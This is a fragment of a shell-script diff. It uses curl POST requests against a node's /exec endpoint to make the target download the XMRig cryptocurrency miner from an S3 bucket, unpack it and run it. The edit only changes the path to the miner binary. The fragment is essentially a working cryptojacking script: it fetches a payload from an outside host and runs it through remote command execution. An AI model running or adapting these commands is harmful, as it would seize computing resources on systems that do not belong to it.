@@ -41,4 +41,4 @@ else
     curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"   
 fi
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
-curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/app/xmrig-6.20.0/xmrig'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'
